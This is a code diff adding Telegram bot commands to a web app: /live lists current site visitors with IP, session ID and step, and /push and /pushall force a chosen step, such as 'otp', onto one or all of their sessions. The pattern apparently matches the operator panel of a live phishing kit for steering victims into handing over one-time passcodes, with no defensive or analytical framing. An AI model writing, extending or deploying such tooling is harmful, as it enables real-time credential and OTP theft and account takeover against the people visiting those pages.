@@ -76,6 +76,42 @@ if (bot) {
     }
   });
 
+  // ── Live visitor control commands ──────────────────────────
+  bot.command('live', async ctx => {
+    try {
+      const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
+      const visitors = db.prepare('SELECT * FROM visitors WHERE last_seen > ? ORDER BY last_seen DESC').all(cutoff);
+      if (!visitors.length) return ctx.reply('🔴 No active visitors right now.');
+      const lines = visitors.map((v, i) =>
+        `${i+1}. 📍 <b>${v.page_title || 'Page'}</b>\n   Step: <code>${v.current_step}</code>\n   IP: ${v.ip}\n   SID: <code>${v.session_id}</code>`
+      ).join('\n\n');
+      ctx.reply(`👥 Active Visitors (${visitors.length}):\n\n${lines}\n\nUse /push SID STEP`, { parse_mode: 'HTML' });
+    } catch (err) { ctx.reply('❌ Error'); }
+  });
+
+  bot.command('push', async ctx => {
+    try {
+      const parts = ctx.message.text.trim().split(/\s+/);
+      if (parts.length < 3) return ctx.reply('Usage: /push SID STEP\nExample: /push abc123 otp\nSpecial: HOME or NEXT');
+      const [, sid, step] = parts;
+      const v = db.prepare('SELECT * FROM visitors WHERE session_id=?').get(sid);
+      if (!v) return ctx.reply('❌ Session not found or expired.');
+      db.prepare(`UPDATE visitors SET pending_step=? WHERE session_id=?`).run(step, sid);
+      ctx.reply(`✅ Pushed <code>${step}</code> to visitor on <b>${v.page_title}</b>`, { parse_mode: 'HTML' });
+    } catch (err) { ctx.reply('❌ Error: ' + err.message); }
+  });
+
+  bot.command('pushall', async ctx => {
+    try {
+      const parts = ctx.message.text.trim().split(/\s+/);
+      if (parts.length < 2) return ctx.reply('Usage: /pushall STEP\nExample: /pushall otp');
+      const step = parts[1];
+      const cutoff = new Date(Date.now() - 10*60*1000).toISOString();
+      const result = db.prepare(`UPDATE visitors SET pending_step=? WHERE last_seen > ?`).run(step, cutoff);
+      ctx.reply(`✅ Pushed <code>${step}</code> to ${result.changes} active visitor(s)`, { parse_mode: 'HTML' });
+    } catch (err) { ctx.reply('❌ Error: ' + err.message); }
+  });
+
   bot.catch((err, ctx) => {
     console.error('Bot error:', err.message);
   });
